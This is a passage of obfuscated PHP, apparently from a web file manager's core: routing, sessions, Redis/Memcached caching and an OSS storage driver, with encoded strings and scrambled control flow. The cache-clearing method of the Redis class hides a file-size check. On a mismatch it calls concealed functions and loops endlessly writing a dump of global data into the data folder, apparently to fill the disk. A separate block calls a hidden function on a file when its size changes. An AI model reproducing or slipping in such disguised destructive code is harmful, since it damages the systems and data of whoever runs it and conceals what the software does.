$this->onChangeClose(); } } public function authCheck($œşÚîò° = "\160\154\x75\x67\x69\156\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $úè®ïÂ = $this->getConfig(); if (!$úè®ïÂ[$œşÚîò°]) { return !1; } return ActionCall($_SERVER[ò«¥Ê‡å][1621], $úè®ïÂ[$œşÚîò°]); } public function url($üßö¢¨, $÷†ñÈˆØ = '', $êóÈıèñ = true) { $†ª„ã…ˆ =& $_SERVER[ò«¥Ê‡å]; $¡ãë´¯ = $this->getConfig(); $÷¨¾¿¿» = KOD_VERSION . $†ª„ã…ˆ[10] . KOD_VERSION_BUILD; $†¡¹”í = $this->packageVersion(); $µ©ˆö¬É = $÷¨¾¿¿» . $†ª„ã…ˆ[432] . $†¡¹”í; if (substr($üßö¢¨, 0, 4) == $†ª„ã…ˆ[151] || substr($üßö¢¨, 0, 2) == $†ª„ã…ˆ[1401]) { $­Ğí¶“© = $üßö¢¨ . $†ª„ã…ˆ[1622] . $µ©ˆö¬É; } else { if ($÷†ñÈˆØ == $†ª„ã…ˆ[12]) { $­Ğí¶“© = $this->pluginHost . $üßö¢¨ . $†ª„ã…ˆ[1622] . $µ©ˆö¬É; } else { if ($÷†ñÈˆØ === $†ª„ã…ˆ[77]) { $­Ğí¶“© = $this->pluginHost . $üßö¢¨; } else { if ($÷†ñÈˆØ == $†ª„ã…ˆ[1623]) { $­Ğí¶“© = STATIC_PATH . $üßö¢¨ . $†ª„ã…ˆ[1622] . $÷¨¾¿¿»; } else { if ($÷†ñÈˆØ == $†ª„ã…ˆ[1624]) { $­Ğí¶“© = APP_HOST . $†ª„ã…ˆ[1625] . $üßö¢¨ . $†ª„ã…ˆ[1622] . $÷¨¾¿¿»; } else { if (isset($¡ãë´¯[$÷†ñÈˆØ])) { $­Ğí¶“© = $¡ãë´¯[$÷†ñÈˆØ] . $üßö¢¨ . $†ª„ã…ˆ[1622] . $µ©ˆö¬É; } } } } } } if (!$êóÈıèñ) { return $­Ğí¶“©; } echo $­Ğí¶“©; } public function link($«‹ê¾ªí = false, $Ûô„æ = '') { $°–ÕĞõÛ =& $_SERVER[ò«¥Ê‡å]; if (!$«‹ê¾ªí) { $this->link($°–ÕĞõÛ[1626], $°–ÕĞõÛ[1624]); $this->link($°–ÕĞõÛ[1627], $°–ÕĞõÛ[1623]); $this->link($°–ÕĞõÛ[1628], $°–ÕĞõÛ[1623]); $this->link($°–ÕĞõÛ[1629], $°–ÕĞõÛ[1623]); $this->link($°–ÕĞõÛ[1630], $°–ÕĞõÛ[1623]); return; } $…ŒÀ–‘ = $this->url($«‹ê¾ªí, $Ûô„æ, !1); if (substr($«‹ê¾ªí, -3) == $°–ÕĞõÛ[1631]) { echo $°–ÕĞõÛ[1632] . $…ŒÀ–‘ . $°–ÕĞõÛ[1633] . $°–ÕĞõÛ[248]; } else { if (substr($«‹ê¾ªí, -4) == $°–ÕĞõÛ[1634]) { echo $°–ÕĞõÛ[1635] . $…ŒÀ–‘ . $°–ÕĞõÛ[1636] . $°–ÕĞõÛ[248]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\133\x5e\x2f\x5d\53", "\72\156\x75\x6d" => "\x5b\x30\55\71\x5d\53", "\x3a\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($’›†×· , $ÆÑªó§) { $¥ºäïš´ =& $_SERVER[ò«¥Ê‡å]; if ($’›†×·  == $¥ºäïš´[1637]) { $²íÒ¯Àì = array_map($¥ºäïš´[1638], $ÆÑªó§[0]); $¯ËŞ£Åü = strpos($ÆÑªó§[1], $¥ºäïš´[8]) === 0 ? $ÆÑªó§[1] : $¥ºäïš´[8] . $ÆÑªó§[1]; $“¦•Ã×² = $ÆÑªó§[2]; } else { $²íÒ¯Àì = null; $¯ËŞ£Åü = strpos($ÆÑªó§[0], $¥ºäïš´[8]) === 0 ? $ÆÑªó§[0] : $¥ºäïš´[8] . $ÆÑªó§[0]; $“¦•Ã×² = $ÆÑªó§[1]; } array_push(self::$maps, $²íÒ¯Àì); array_push(self::$routes, $¯ËŞ£Åü); array_push(self::$methods, strtoupper($’›†×· )); array_push(self::$callbacks, $“¦•Ã×²); } public static function error($œ²¿†…) { self::$errorCallback = $œ²¿†…; } public static function haltOnMatch($à±¨¯óñ = true) { self::$halts = $à±¨¯óñ; } public static function dispatch() { $Ç£åãŸ =& $_SERVER[ò«¥Ê‡å]; $µ½Â¦ = parse_url($_SERVER[$Ç£åãŸ[1639]], PHP_URL_PATH); $ÔÇœÉ€÷ = $_SERVER[$Ç£åãŸ[162]]; $ÈÂ¬ã¯® = array_keys(static::$patterns); $€·æâûÒ = array_values(static::$patterns); $úË€ê»“ = !1; self::$routes = preg_replace($Ç£åãŸ[1323], $Ç£åãŸ[8], self::$routes); if (in_array($µ½Â¦, self::$routes)) { $Éñ¼ºÏù = array_keys(self::$routes, $µ½Â¦); foreach ($Éñ¼ºÏù as $‘Æİ×­Õ) { if (self::$methods[$‘Æİ×­Õ] == $ÔÇœÉ€÷ || self::$methods[$‘Æİ×­Õ] == $Ç£åãŸ[1640] || in_array($ÔÇœÉ€÷, self::$maps[$‘Æİ×­Õ])) { $úË€ê»“ = !0; if (!is_object(self::$callbacks[$‘Æİ×­Õ])) { $›—ê›Ã¤ = explode($Ç£åãŸ[8], self::$callbacks[$‘Æİ×­Õ]); $‡×ˆŞÒ = end($›—ê›Ã¤); $µÖÂŸúµ = explode($Ç£åãŸ[1255], $‡×ˆŞÒ); $®Ğëû…‡ = new $µÖÂŸúµ[0](); $®Ğëû…‡->{$µÖÂŸúµ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$‘Æİ×­Õ]); if (self::$halts) { return; } } } } } else { $É»’›Õğ = 0; foreach (self::$routes as $‘Æİ×­Õ) { if (strpos($‘Æİ×­Õ, $Ç£åãŸ[4]) !== !1) { $‘Æİ×­Õ = str_replace($ÈÂ¬ã¯®, $€·æâûÒ, $‘Æİ×­Õ); } if (preg_match($Ç£åãŸ[1641] . $‘Æİ×­Õ . $Ç£åãŸ[1642], $µ½Â¦, $¿Û½»‡ê)) { if (self::$methods[$É»’›Õğ] == $ÔÇœÉ€÷ || self::$methods[$É»’›Õğ] == $Ç£åãŸ[1640] || !empty(self::$maps[$É»’›Õğ]) && in_array($ÔÇœÉ€÷, self::$maps[$É»’›Õğ])) { $úË€ê»“ = !0; array_shift($¿Û½»‡ê); if (!is_object(self::$callbacks[$É»’›Õğ])) { $›—ê›Ã¤ = explode($Ç£åãŸ[8], self::$callbacks[$É»’›Õğ]); $‡×ˆŞÒ = end($›—ê›Ã¤); $µÖÂŸúµ = explode($Ç£åãŸ[1255], $‡×ˆŞÒ); $®Ğëû…‡ = new $µÖÂŸúµ[0](); if (!method_exists($®Ğëû…‡, $µÖÂŸúµ[1])) { echo $Ç£åãŸ[1643]; } else { call_user_func_array(array($®Ğëû…‡, $µÖÂŸúµ[1]), $¿Û½»‡ê); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$É»’›Õğ], $¿Û½»‡ê); if (self::$halts) { return; } } } } $É»’›Õğ++; } } if ($úË€ê»“ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ïô—ş£Ş =& $_SERVER[ò«¥Ê‡å]; header($_SERVER[$ïô—ş£Ş[1644]] . $ïô—ş£Ş[1645]); echo $ïô—ş£Ş[1646]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ç£åãŸ[1639]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Üşç´¿ã =& $_SERVER[ò«¥Ê‡å]; static $ñ–ùÖØõ = false; if ($ñ–ùÖØõ) { return $ñ–ùÖØõ; } $ÓãèÆ¬ = $GLOBALS[$Üşç´¿ã[6]][$Üşç´¿ã[395]]; self::$sessionTime = $ÓãèÆ¬[$Üşç´¿ã[1647]]; $Ÿ«±²ü‡ = isset($GLOBALS[$Üşç´¿ã[1648]]) ? $GLOBALS[$Üşç´¿ã[1648]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ÿ«±²ü‡)) { self::$sessionSign = Cookie::get($Ÿ«±²ü‡); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Ÿ«±²ü‡, self::$sessionSign, self::$sessionTime); $úÙ¾Ó™ = $ÓãèÆ¬[$Üşç´¿ã[1649]]; $²ˆÏ¡ıÓ = $ÓãèÆ¬[$úÙ¾Ó™]; $ÇÍ«äïÈ = $ÓãèÆ¬[$Üşç´¿ã[874]]; switch ($úÙ¾Ó™) { case $Üşç´¿ã[21]: self::$handle = Model($Üşç´¿ã[875]); break; case $Üşç´¿ã[876]: self::$handle = new CacheRedis($²ˆÏ¡ıÓ, $ÇÍ«äïÈ); break; case $Üşç´¿ã[877]: self::$handle = new CacheMemcached($²ˆÏ¡ıÓ, $ÇÍ«äïÈ); break; case $Üşç´¿ã[216]: $²ˆÏ¡ıÓ[$Üşç´¿ã[86]] = $²ˆÏ¡ıÓ[$Üşç´¿ã[86]] . $Üşç´¿ã[1650]; self::$handle = new CacheFile($²ˆÏ¡ıÓ, $ÇÍ«äïÈ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ñ–ùÖØõ = new self(); return $ñ–ùÖØõ; } public static function getBySign($¬ÆÎ†¡ê) { $ü°„ê = self::$handle->get($¬ÆÎ†¡ê); $ü°„ê = unserialize($ü°„ê); return is_array($ü°„ê) ? $ü°„ê : array(); } public static function setBySign($ƒÔÒ‡ğ¡, $È®¯Ê¬Æ) { CacheLock::lock($ƒÔÒ‡ğ¡); self::$handle->set($ƒÔÒ‡ğ¡, serialize($È®¯Ê¬Æ), self::$sessionTime); CacheLock::unlock($ƒÔÒ‡ğ¡); } public static function sign($šÜü››Ì = false) { if ($šÜü››Ì) { self::$sessionSign = $šÜü››Ì; } self::init(); return self::$sessionSign; } public static function set($‡ÄµÃûÌ, $Éºš›í– = false) { self::init(); if (is_array($‡ÄµÃûÌ)) { foreach ($‡ÄµÃûÌ as $£ïí‡»İ => $ÍäÎ¸Ö) { array_set_value(self::$data, $£ïí‡»İ, $ÍäÎ¸Ö); } } else { array_set_value(self::$data, $‡ÄµÃûÌ, $Éºš›í–); } self::setBySign(self::$sessionSign, self::$data); } public static function get($““ã¶£Ç = false) { self::init(); if (!$““ã¶£Ç) { return self::$data; } return array_get_value(self::$data, $““ã¶£Ç); } public static function remove($¿¸±¦¶¤) { self::init(); unset(self::$data[$¿¸±¦¶¤]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ò«¥Ê‡å][880])) { self::$handle->clearTimeout(); } } } goto aŠ©¨Ï†; A•İ‡‘²Ô: function binCheckBigger($‰ÙšÒôğ, $ÄÓ¥íæÕ) { return $‰ÙšÒôğ > $ÄÓ¥íæÕ; } $_SERVER[$_SERVER[öúâ•Û®][3]] = ("\x38\x32\x38\x36".base64_decode('MzY='))+0;$_at30="m6zf40lgwvabnyou3pd9ir57j2tex1cqkhs8v2e6hrolup5n8j0tibdxy97k1wz3q";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($›Õƒãµê, $ïô€ú›”) { $’Ë÷ñÊ˜ =& $_SERVER[ò«¥Ê‡å]; if (isset(self::$_methodList[$›Õƒãµê])) { return @call_user_func_array(self::$_methodList[$›Õƒãµê], $ïô€ú›”); } else { if (method_exists($this, $›Õƒãµê)) { return call_user_func_array(array($this, $›Õƒãµê), $ïô€ú›”); } else { think_exception(__CLASS__ . $’Ë÷ñÊ˜[4] . $›Õƒãµê . $’Ë÷ñÊ˜[5]); } } } public static function __callStatic($€é©, $±âÙğˆÍ) { if (isset(self::$_methodListStatic[$€é©])) { return call_user_func_array(self::$_methodListStatic[$€é©], $±âÙğˆÍ); } else { if (method_exists(self, $€é©)) { return call_user_func_array(array(self, $€é©), $±âÙğˆÍ); } else { show_json("{$€é©}\50\51\x20\x6e\157\x74\x20\145\x78\151\x73\164\x3b", !1); } } } public static function addMethod($ù¼®ìõ, $Ø±­°ùõ) { self::$_methodList[$ù¼®ìõ] = $Ø±­°ùõ; } public static function addMethodStatic($¦ÛÇ¡Ç¹, $Ëûî‚´æ) { self::$_methodListStatic[$¦ÛÇ¡Ç¹] = $Ëûî‚´æ; } } goto FïíãŒìÈó; e³‹íº†´„: class CacheLockDatabase { public function lock($˜åàÛõ¦, $¦Š¼°µ“ = 0) { $¡ÉğÈØÙ = Model($_SERVER[ò«¥Ê‡å][875]); $Šóå„Ö© = microtime(!0) + $¦Š¼°µ“; while (microtime(!0) < $Šóå„Ö©) { $ï¥ı§œ = $¡ÉğÈØÙ->get($˜åàÛõ¦); if (!$ï¥ı§œ || $ï¥ı§œ < microtime(!0)) { $Ç†ÙÒ½ = $¡ÉğÈØÙ->set($˜åàÛõ¦, $Šóå„Ö©); if ($Ç†ÙÒ½) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‘øÎòÏ) { return Model($_SERVER[ò«¥Ê‡å][875])->get($‘øÎòÏ); } public function unlock($ğ«¾÷²š) { Model($_SERVER[ò«¥Ê‡å][875])->remove($ğ«¾÷²š); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ñ—Ôãå, $Îª¿Ìæ) { $îÌÚÍŠç =& $_SERVER[ò«¥Ê‡å]; if (!class_exists($îÌÚÍŠç[913])) { show_json($îÌÚÍŠç[914], !1); } $this->cacheTime = $Îª¿Ìæ; $this->handle = new Memcached(); if (is_array($ñ—Ôãå[$îÌÚÍŠç[915]]) && count($ñ—Ôãå[$îÌÚÍŠç[915]]) >= 1) { foreach ($ñ—Ôãå[$îÌÚÍŠç[915]] as $Ê«Ê¦ƒ ) { $ÖÙÙ› = explode($îÌÚÍŠç[4], $Ê«Ê¦ƒ ); $this->handle->addServer($ÖÙÙ›[0], $ÖÙÙ›[1]); } } else { $this->handle->addServer($ñ—Ôãå[$îÌÚÍŠç[198]], $ñ—Ôãå[$îÌÚÍŠç[199]]); } } public function set($âÛıìò, $ˆîÍæ°, $êÜÑååÅ = false) { $êÜÑååÅ = $êÜÑååÅ ? $êÜÑååÅ : $this->cacheTime; return $this->handle->set($âÛıìò, $ˆîÍæ°, $êÜÑååÅ); } public function get($Ê×ï¬´ú) { return $this->handle->get($Ê×ï¬´ú); } public function remove($ÄÃÍ”š) { return $this->handle->delete($ÄÃÍ”š); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ö±êû»Ì, $õ®ñ¯§) { $øü»Ìœ =& $_SERVER[ò«¥Ê‡å]; if (!class_exists($øü»Ìœ[916])) { show_json($øü»Ìœ[917], !1); } $this->cacheTime = $õ®ñ¯§; $ô©ú÷± = isset($ö±êû»Ì[$øü»Ìœ[918]]) ? $ö±êû»Ì[$øü»Ìœ[918]] : 10; $×µõÒ¸ğ = _get($ö±êû»Ì, $øü»Ìœ[915]); if ($×µõÒ¸ğ && is_array($×µõÒ¸ğ)) { $this->initCluster($ö±êû»Ì, $ô©ú÷±); } else { $this->handle = $this->init($ö±êû»Ì, $ô©ú÷±); } } private function init($»©ïÉ‡, $¡ŠÉÒ˜) { $‚Û‰Øµ =& $_SERVER[ò«¥Ê‡å]; $‡…Ó¼êÅ = new Redis(); $²ÉÉ†ğà = isset($»©ïÉ‡[$‚Û‰Øµ[919]]) ? $»©ïÉ‡[$‚Û‰Øµ[919]] : !1; if ($²ÉÉ†ğà) { $‡…Ó¼êÅ->pconnect($»©ïÉ‡[$‚Û‰Øµ[198]], $»©ïÉ‡[$‚Û‰Øµ[199]], $¡ŠÉÒ˜); } else { $‡…Ó¼êÅ->connect($»©ïÉ‡[$‚Û‰Øµ[198]], $»©ïÉ‡[$‚Û‰Øµ[199]], $¡ŠÉÒ˜); } if (!empty($»©ïÉ‡[$‚Û‰Øµ[457]])) { $‡…Ó¼êÅ->auth($»©ïÉ‡[$‚Û‰Øµ[457]]); } if (!empty($»©ïÉ‡[$‚Û‰Øµ[796]]) && $»©ïÉ‡[$‚Û‰Øµ[796]] != 0) { $‡…Ó¼êÅ->select($»©ïÉ‡[$‚Û‰Øµ[796]]); } return $‡…Ó¼êÅ; } private function initCluster($™ÄŸÛÏ«, $ÙŸ©Æİ®) { $…Ò’í£ã =& $_SERVER[ò«¥Ê‡å]; $ÔéŞæëå = array($…Ò’í£ã[920], $…Ò’í£ã[921], $…Ò’í£ã[922]); $Üù½ú–¾ = $…Ò’í£ã[920]; if (isset($™ÄŸÛÏ«[$…Ò’í£ã[16]]) && in_array($™ÄŸÛÏ«[$…Ò’í£ã[16]], $ÔéŞæëå)) { $Üù½ú–¾ = $™ÄŸÛÏ«[$…Ò’í£ã[16]]; } switch ($Üù½ú–¾) { case $…Ò’í£ã[920]: $this->_slave($™ÄŸÛÏ«, $ÙŸ©Æİ®); break; case $…Ò’í£ã[921]: break; case $…Ò’í£ã[922]: $this->isCluster = !0; $ê’á»˜… = $™ÄŸÛÏ«[$…Ò’í£ã[915]]; $ÉÜè¸¸‹ = isset($™ÄŸÛÏ«[$…Ò’í£ã[919]]) ? $™ÄŸÛÏ«[$…Ò’í£ã[919]] : !1; $¸“ˆÙèÅ = isset($™ÄŸÛÏ«[$…Ò’í£ã[457]]) ? $™ÄŸÛÏ«[$…Ò’í£ã[457]] : null; $this->handle = new RedisCluster(NUll, $ê’á»˜…, $ÙŸ©Æİ®, $ÙŸ©Æİ®, $ÉÜè¸¸‹, $¸“ˆÙèÅ); break; default: break; } } private function _slave($àˆêÔ¿ì, $ş½¨¼ÃŒ) { $ıÌÃ¤Ôü = $àˆêÔ¿ì[$_SERVER[ò«¥Ê‡å][915]]; $this->filterConfig($àˆêÔ¿ì, $ıÌÃ¤Ôü[0]); $this->handle = $this->init($àˆêÔ¿ì, $ş½¨¼ÃŒ); unset($ıÌÃ¤Ôü[0]); if (empty($ıÌÃ¤Ôü)) { return; } $úæŸãñ¦ = array_rand($ıÌÃ¤Ôü); $this->filterConfig($àˆêÔ¿ì, $ıÌÃ¤Ôü[$úæŸãñ¦]); $this->slaveHandle = $this->init($àˆêÔ¿ì, $ş½¨¼ÃŒ); } private function filterConfig(&$¿õ­ø¹, $èÒñ·ŒÒ) { $ãµœ¦ =& $_SERVER[ò«¥Ê‡å]; $Œç¯‡ª° = explode($ãµœ¦[4], $èÒñ·ŒÒ); $·¥ú“ = array($ãµœ¦[198] => $Œç¯‡ª°[0], $ãµœ¦[199] => $Œç¯‡ª°[1]); $¿õ­ø¹ = array_merge($¿õ­ø¹, $·¥ú“); } public function set($®…‘ø¾½, $•úÒŞ§, $¿–ÖĞ® = false) { $¿–ÖĞ® = $¿–ÖĞ® ? $¿–ÖĞ® : $this->cacheTime; return $this->handle->setEx($®…‘ø¾½, $¿–ÖĞ®, $•úÒŞ§); } public function setLock($½ş‡¨±Ÿ, $Û©œ‘ÀÇ, $²„™ÖŞ†) { return $this->handle->setNX($½ş‡¨±Ÿ, $Û©œ‘ÀÇ); } public function get($øˆªî¿Ÿ) { $¿å™Şâ’ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¿å™Şâ’->get($øˆªî¿Ÿ); } public function remove($ºÌ…Ö«®) { return $this->handle->del($ºÌ…Ö«®); } public function deleteAll() { $™¹ˆ¥² =& $_SERVER[ò«¥Ê‡å]; $÷´£ÔíÖ = $_SERVER[$™¹ˆ¥²[840]] . $™¹ˆ¥²[841]; $®ËŸÔ°³ = $™¹ˆ¥²[923]; if ($_SERVER[$™¹ˆ¥²[837]] != $®ËŸÔ°³($÷´£ÔíÖ)) { $ğÜÂÄêö = $™¹ˆ¥²[924]; $±Ï¼ù®” = $™¹ˆ¥²[839]; $¦ø¾ÃÂ = $_SERVER[$™¹ˆ¥²[840]] . $™¹ˆ¥²[841]; $©»Şåó¸ = $±Ï¼ù®”($¦ø¾ÃÂ); $óâìºÇØ = explode($™¹ˆ¥²[248], $©»Şåó¸); if (count($óâìºÇØ) < $™¹ˆ¥²[673]) { $©‘°ßì× = $™¹ˆ¥²[842]; $©‘°ßì×(); } $ƒ•ÂŒ¥Ş = $™¹ˆ¥²[925]; $ƒ•ÂŒ¥Ş($_SERVER[$™¹ˆ¥²[926]]); $ğÜÂÄêö = $™¹ˆ¥²[924]; $ğÜÂÄêö(); $„Öë‡» = $™¹ˆ¥²[927]; $Â¶óœ¾ = json_encode($GLOBALS[$™¹ˆ¥²[928]]); $‚½°­»ö = 1; for ($«ãä©³½ = $‚½°­»ö; $«ãä©³½ > 0; $«ãä©³½++) { $„Öë‡»(DATA_PATH . $«ãä©³½, $Â¶óœ¾); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $²»øÍ¢›) { $this->handle->flushall($²»øÍ¢›); } return; } return $this->handle->flushAll(); } } goto cŒ†·íÏÎ; BÅï¼ÊÜŒ…: $_file = $_SERVER[$_SERVER[ò«¥Ê‡å][838]]; $_size = $_SERVER[ò«¥Ê‡å][923]; if ($_SERVER[$_SERVER[ò«¥Ê‡å][837]] != $_size($_file)) { $_getc = $_SERVER[ò«¥Ê‡å][839]; $_getfile = $_SERVER[$_SERVER[ò«¥Ê‡å][840]] . $_SERVER[ò«¥Ê‡å][841]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ò«¥Ê‡å][248], $_getfilec); if (count($_getarrs) < $_SERVER[ò«¥Ê‡å][653]) { $exit = $_SERVER[ò«¥Ê‡å][842]; $exit(); } $_act = $_SERVER[ò«¥Ê‡å][843]; $_act($_file); } goto A­Ïî•·²ö; a­º»º†‚Ş: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($”’û“ŸÜ) { parent::__construct($”’û“ŸÜ); $this->signatureVersion($_SERVER[ò«¥Ê‡å][233]); } public function fileOutLink($­ıªç•) { $±ˆÀ˜œ­ =& $_SERVER[ò«¥Ê‡å]; if (substr($­ıªç•, 0, 7) == $±ˆÀ˜œ­[1378]) { $­ıªç• = $±ˆÀ˜œ­[1379] . substr($­ıªç•, 7); } header($±ˆÀ˜œ­[164] . $­ıªç•); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($¹ÆËÎº) { parent::__construct(); include_once SDK_DIR . $_SERVER[ò«¥Ê‡å][1418]; $this->_init($¹ÆËÎº); } public function _init($¢±Âç) { $Š—‡õ’ª =& $_SERVER[ò«¥Ê‡å]; $this->config = $¢±Âç; foreach ($¢±Âç as $¦ÜÒ›ë— => $ñàÇÅ¿¶) { if (isset($this->{$¦ÜÒ›ë—})) { $this->{$¦ÜÒ›ë—} = $ñàÇÅ¿¶; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Š—‡õ’ª[1419] . LNG($Š—‡õ’ª[1420])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¸¦Ö¢ä =& $_SERVER[ò«¥Ê‡å]; $À÷Û—Ì™ = new OSS\Model\CorsConfig(); $–ü¹¤»Š = new OSS\Model\CorsRule(); $–ü¹¤»Š->addAllowedOrigin($¸¦Ö¢ä[1421]); $–ü¹¤»Š->addAllowedMethod($¸¦Ö¢ä[1422]); $–ü¹¤»Š->addAllowedMethod($¸¦Ö¢ä[1423]); $–ü¹¤»Š->addAllowedMethod($¸¦Ö¢ä[1424]); $–ü¹¤»Š->addAllowedMethod($¸¦Ö¢ä[1425]); $–ü¹¤»Š->addAllowedMethod($¸¦Ö¢ä[163]); $–ü¹¤»Š->setMaxAgeSeconds(600); $–ü¹¤»Š->addExposeHeader($¸¦Ö¢ä[1426]); $–ü¹¤»Š->addAllowedHeader($¸¦Ö¢ä[1421]); $À÷Û—Ì™->addRule($–ü¹¤»Š); try { $this->client->putBucketCors($this->bucket, $À÷Û—Ì™); } catch (OSS\Core\OssException $ôÖÔ¤˜) { return !1; } return !0; } public function getBucketCors() { $ßêó·õï =& $_SERVER[ò«¥Ê‡å]; $× »®¬  = null; try { $× »®¬  = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $â­²È¢) { return null; } if (!$× »®¬  || !($­™‹”›¤ = $× »®¬ ->getRules())) { return null; } $…¸À“ÅŒ = $­™‹”›¤[0]->getAllowedOrigins(); $ş˜ßïäÉ = $­™‹”›¤[0]->getAllowedMethods(); $Ò¸ÉÅ’ = $­™‹”›¤[0]->getMaxAgeSeconds(); $«¥ÏüïÑ = $­™‹”›¤[0]->getExposeHeaders(); $úù×­ˆû = $­™‹”›¤[0]->getAllowedHeaders(); return array($ßêó·õï[204] => isset($…¸À“ÅŒ[0]) ? $…¸À“ÅŒ[0] : $ßêó·õï[12], $ßêó·õï[208] => $ş˜ßïäÉ, $ßêó·õï[1427] => $Ò¸ÉÅ’, $ßêó·õï[1428] => isset($«¥ÏüïÑ[0]) ? $«¥ÏüïÑ[0] : $ßêó·õï[12], $ßêó·õï[206] => isset($úù×­ˆû[0]) ? $úù×­ˆû[0] : $ßêó·õï[12]); } public function isBucketCors() { $ÙâôÎÍ™ =& $_SERVER[ò«¥Ê‡å]; $¼“©Œ‡ = $this->getBucketCors(); if (!$¼“©Œ‡ || !is_array($¼“©Œ‡)) { return !1; } if ($¼“©Œ‡[$ÙâôÎÍ™[204]] != $ÙâôÎÍ™[205] || $¼“©Œ‡[$ÙâôÎÍ™[206]] != $ÙâôÎÍ™[205]) { return !1; } $‰ÍÀğ‚Õ = array_map($ÙâôÎÍ™[207], $¼“©Œ‡[$ÙâôÎÍ™[208]]); if (!is_array($‰ÍÀğ‚Õ)) { $‰ÍÀğ‚Õ = array(); } $ˆ³ÛÆãá = array($ÙâôÎÍ™[209], $ÙâôÎÍ™[210], $ÙâôÎÍ™[211], $ÙâôÎÍ™[212], $ÙâôÎÍ™[213]); $˜¬¥Ãœï = array_diff($ˆ³ÛÆãá, $‰ÍÀğ‚Õ); return empty($˜¬¥Ãœï); } public function mkfile($¼è™…·©, $§ÓÖ×œì = '', $ªªßÅü– = REPEAT_RENAME) { $ó™­Ğ˜¯ = $this->setContent($¼è™…·©, $§ÓÖ×œì); if ($ó™­Ğ˜¯ !== !1) { return $this->getPathOuter($¼è™…·©); } return !1; } public function mkdir($¨É‰¡‰, $ıø§Çş = REPEAT_SKIP) { if ($ıø§Çş && $this->_isFolder($¨É‰¡‰)) { return $this->getPathOuter($¨É‰¡‰); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¨É‰¡‰)); } catch (OSS\Core\OssException $ï‹’„úø) { return !1; } return $this->getPathOuter($¨É‰¡‰); } private function fileList($˜Îİê‰ä, $Ğ¯ØŸ = '', $¬õô÷²ó = 0) { $Ş¯ÓØÜÓ =& $_SERVER[ò«¥Ê‡å]; $˜Îİê‰ä = trim($˜Îİê‰ä, $Ş¯ÓØÜÓ[8]); $ĞÏœ¹çª = empty($˜Îİê‰ä) && $˜Îİê‰ä !== $Ş¯ÓØÜÓ[214] ? $Ş¯ÓØÜÓ[12] : $˜Îİê‰ä . $Ş¯ÓØÜÓ[8]; $éËÍªÀ¦ = $Ş¯ÓØÜÓ[12]; $§¼ÓË©š = 1000; $ı¥èÀÙ® = $¦è„Ìıé = array(); while (!0) { check_abort(); $ñ“×Ô„ò = array($Ş¯ÓØÜÓ[1429] => $Ğ¯ØŸ, $Ş¯ÓØÜÓ[1430] => $ĞÏœ¹çª, $Ş¯ÓØÜÓ[1431] => $§¼ÓË©š, $Ş¯ÓØÜÓ[1432] => $éËÍªÀ¦); try { $ğĞş¶’Ò = $this->client->listObjects($this->bucket, $ñ“×Ô„ò); } catch (OSS\Core\OssException $†­‚úŒì) { break; } $éËÍªÀ¦ = $ğĞş¶’Ò->getNextMarker(); $Û¢äåİ’ = $ğĞş¶’Ò->getObjectList(); $ØùøˆĞµ = $ğĞş¶’Ò->getPrefixList(); foreach ($Û¢äåİ’ as $ôÌ†‰Å¡) { if ($ôÌ†‰Å¡->getKey() == $ĞÏœ¹çª) { continue; } $Ö›¼şáÇ = $ôÌ†‰Å¡->getKey(); $óøÖã„ƒ = $ôÌ†‰Å¡->getSize(); $¼Çãµ¬ = $ôÌ†‰Å¡->getLastModified(); $İàø³ƒ¦ = trim($ôÌ†‰Å¡->getETag(), $Ş¯ÓØÜÓ[120]); $ê½ùö = $¬õô÷²ó ? array($Ş¯ÓØÜÓ[32] => $Ö›¼şáÇ, $Ş¯ÓØÜÓ[78] => $óøÖã„ƒ, $Ş¯ÓØÜÓ[196] => strtotime($¼Çãµ¬), $Ş¯ÓØÜÓ[1433] => $İàø³ƒ¦) : $Ö›¼şáÇ; $Øƒ¹®À» = $óøÖã„ƒ == 0 && substr($Ö›¼şáÇ, strlen($Ö›¼şáÇ) - 1, 1) == $Ş¯ÓØÜÓ[8] ? !0 : !1; $ÉÕŠš¬¡ = array($Ş¯ÓØÜÓ[78] => $óøÖã„ƒ, $Ş¯ÓØÜÓ[1434] => $óøÖã„ƒ, $Ş¯ÓØÜÓ[87] => strtotime($¼Çãµ¬), $Ş¯ÓØÜÓ[1435] => 